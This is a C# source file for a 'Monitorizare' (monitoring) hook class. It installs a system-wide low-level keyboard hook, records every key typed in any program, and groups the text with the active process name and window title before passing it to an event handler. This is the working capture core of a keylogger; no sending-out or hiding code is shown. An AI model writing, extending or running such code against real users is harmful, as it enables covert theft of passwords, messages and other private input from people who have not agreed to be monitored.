using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Diagnostics;

namespace Monitorizare
{    
    public delegate void KeystrokeEventHandler(KeystrokeEventArgs e);
    public class KeystrokeEventArgs
    {
        public KeystrokeEventArgs(string keystroke,string process, string window)
        {
            Keystroke = keystroke;
            Process = process;
            Window = window;
        }
        public string Keystroke, Process, Window;
    }
    class Hook
    {
        public Hook(bool hookKeyboard, bool hookClipboard)
        {
            HookKeyboard = hookKeyboard;            
        }

        public bool HookKeyboard;

        IntPtr keyboardHookID = IntPtr.Zero;
        IntPtr clipboardHookID = IntPtr.Zero;

        delegate IntPtr KeyboardProcDelegate(int nCode, IntPtr wParam, IntPtr lParam);
        KeyboardProcDelegate KeyboardProc;
        public event KeystrokeEventHandler Keystroke;
        int lastPID = -1;
        string toLog = "", lastproc = "", lastwnd = "";

        public void Start()
        {
            if (HookKeyboard)
            {
                KeyboardProc = KeyboardHookCallback;
                keyboardHookID = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, IntPtr.Zero, 0);
            }
        }
        public void Stop()
        {
            UnhookWindowsHookEx(keyboardHookID);
        }
        private IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // Read structure KeyboardHookStruct at lParam
                KeyboardHookStruct MyKeyboardHookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardHookStruct));
                bool isDownShift = ((WinAPI.GetKeyState(VK_SHIFT) & 0x80) == 0x80 ? true : false);
                bool isDownCapslock = (WinAPI.GetKeyState(VK_CAPITAL) != 0 ? true : false);
                byte[] keyState = new byte[256];
                WinAPI.GetKeyboardState(keyState);
                byte[] inBuffer = new byte[2];
                int toAscii = WinAPI.ToAscii(MyKeyboardHookStruct.vkCode, MyKeyboardHookStruct.scanCode, keyState, inBuffer, MyKeyboardHookStruct.flags);
                if (toAscii == 1)
                {
                    char key = (char)inBuffer[0];
                    if ((isDownCapslock ^ isDownShift) && Char.IsLetter(key)) key = Char.ToUpper(key);
                    Process p = Process.GetProcessById(WinAPI.GetWindowProcessID(WinAPI.GetForegroundWindow()));
                    string process;
                    string window;
                    if (lastPID == -1)
                    {
                        lastPID = p.Id;
                        lastproc = p.ProcessName;
                        lastwnd = WinAPI.ActiveApplTitle().Trim().Replace("\0", "");
                    }
                    if (p.Id != lastPID && toLog != "" && Keystroke != null)
                    {
                        Keystroke(new KeystrokeEventArgs(toLog, lastproc, lastwnd));
                        lastproc = p.ProcessName;
                        lastwnd = WinAPI.ActiveApplTitle().Trim().Replace("\0", "");
                        toLog = "";
                        lastPID = p.Id;
                    }
                    switch ((byte)key)
                    {
                        case 27:
                            toLog += "[Escape]";
                            break;
                        case 32:
                            toLog += "[Space]";
                            break;
                        case 13:
                            toLog += "[Enter]";
                            break;
                        case 9:
                            toLog += "[Tab]";
                            break;
                        case 8:
                            toLog += "[Backspace]";
                            break;
                        case 44:
                            toLog += "[Virgula]";
                            break;
                        default:
                            toLog += key.ToString();
                            break;
                    }
                }
            }
            return CallNextHookEx(keyboardHookID, nCode, wParam, lParam);
        }
        private IntPtr ClipboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            return IntPtr.Zero;
        }

        #region Imported WinAPI functions
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProcDelegate lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);       
        #endregion
        #region Win32 Constants
        private const int WH_CALLWNDPROC = 4;
        private const int WH_KEYBOARD_LL = 13;
        //values from Winuser.h in Microsoft SDK.
        /// <summary>
        /// Windows NT/2000/XP: Installs a hook procedure that monitors low-level mouse input events.
        /// </summary>
        private const int WH_MOUSE_LL = 14;

        /// <summary>
        /// Windows NT/2000/XP: Installs a hook procedure that monitors low-level keyboard  input events.
        /// </summary>

        /// <summary>
        /// Installs a hook procedure that monitors mouse messages. For more information, see the MouseProc hook procedure. 
        /// </summary>
        private const int WH_MOUSE = 7;

        /// <summary>
        /// Installs a hook procedure that monitors keystroke messages. For more information, see the KeyboardProc hook procedure. 
        /// </summary>
        private const int WH_KEYBOARD = 2;

        /// <summary>
        /// The WM_MOUSEMOVE message is posted to a window when the cursor moves. 
        /// </summary>
        private const int WM_MOUSEMOVE = 0x200;

        /// <summary>
        /// The WM_LBUTTONDOWN message is posted when the user presses the left mouse button 
        /// </summary>
        private const int WM_LBUTTONDOWN = 0x201;

        /// <summary>
        /// The WM_RBUTTONDOWN message is posted when the user presses the right mouse button
        /// </summary>
        private const int WM_RBUTTONDOWN = 0x204;

        /// <summary>
        /// The WM_MBUTTONDOWN message is posted when the user presses the middle mouse button 
        /// </summary>
        private const int WM_MBUTTONDOWN = 0x207;

        /// <summary>
        /// The WM_LBUTTONUP message is posted when the user releases the left mouse button 
        /// </summary>
        private const int WM_LBUTTONUP = 0x202;

        /// <summary>
        /// The WM_RBUTTONUP message is posted when the user releases the right mouse button 
        /// </summary>
        private const int WM_RBUTTONUP = 0x205;

        /// <summary>
        /// The WM_MBUTTONUP message is posted when the user releases the middle mouse button 
        /// </summary>
        private const int WM_MBUTTONUP = 0x208;

        /// <summary>
        /// The WM_LBUTTONDBLCLK message is posted when the user double-clicks the left mouse button 
        /// </summary>
        private const int WM_LBUTTONDBLCLK = 0x203;

        /// <summary>
        /// The WM_RBUTTONDBLCLK message is posted when the user double-clicks the right mouse button 
        /// </summary>
        private const int WM_RBUTTONDBLCLK = 0x206;

        /// <summary>
        /// The WM_RBUTTONDOWN message is posted when the user presses the right mouse button 
        /// </summary>
        private const int WM_MBUTTONDBLCLK = 0x209;

        /// <summary>
        /// The WM_MOUSEWHEEL message is posted when the user presses the mouse wheel. 
        /// </summary>
        private const int WM_MOUSEWHEEL = 0x020A;

        /// <summary>
        /// The WM_KEYDOWN message is posted to the window with the keyboard focus when a nonsystem 
        /// key is pressed. A nonsystem key is a key that is pressed when the ALT key is not pressed.
        /// </summary>
        private const int WM_KEYDOWN = 0x100;

        /// <summary>
        /// The WM_KEYUP message is posted to the window with the keyboard focus when a nonsystem 
        /// key is released. A nonsystem key is a key that is pressed when the ALT key is not pressed, 
        /// or a keyboard key that is pressed when a window has the keyboard focus.
        /// </summary>
        private const int WM_KEYUP = 0x101;

        /// <summary>
        /// The WM_SYSKEYDOWN message is posted to the window with the keyboard focus when the user 
        /// presses the F10 key (which activates the menu bar) or holds down the ALT key and then 
        /// presses another key. It also occurs when no window currently has the keyboard focus; 
        /// in this case, the WM_SYSKEYDOWN message is sent to the active window. The window that 
        /// receives the message can distinguish between these two contexts by checking the context 
        /// code in the lParam parameter. 
        /// </summary>
        private const int WM_SYSKEYDOWN = 0x104;

        /// <summary>
        /// The WM_SYSKEYUP message is posted to the window with the keyboard focus when the user 
        /// releases a key that was pressed while the ALT key was held down. It also occurs when no 
        /// window currently has the keyboard focus; in this case, the WM_SYSKEYUP message is sent 
        /// to the active window. The window that receives the message can distinguish between 
        /// these two contexts by checking the context code in the lParam parameter. 
        /// </summary>
        private const int WM_SYSKEYUP = 0x105;

        private const byte VK_SHIFT = 0x10;
        private const byte VK_CAPITAL = 0x14;
        private const byte VK_NUMLOCK = 0x90;
        private const byte VK_CONTROL = 0x11;
        private const byte VK_ALT = 0x12; 
 
        #endregion
        #region Structs
        [StructLayout(LayoutKind.Sequential)]
        class KeyboardHookStruct
        {
            /// <summary>
            /// Specifies a virtual-key code. The code must be a value in the range 1 to 254. 
            /// </summary>
            public int vkCode;

            /// <summary>
            /// Specifies a hardware scan code for the key. 
            /// </summary>
            public int scanCode;

            /// <summary>
            /// Specifies the extended-key flag, event-injected flag, context code, and transition-state flag.
            /// </summary>
            public int flags;

            /// <summary>
            /// Specifies the time stamp for this message.
            /// </summary>
            public int time;

            /// <summary>
            /// Specifies extra information associated with the message. 
            /// </summary>
            public int dwExtraInfo;
        }        
        #endregion
    }
}
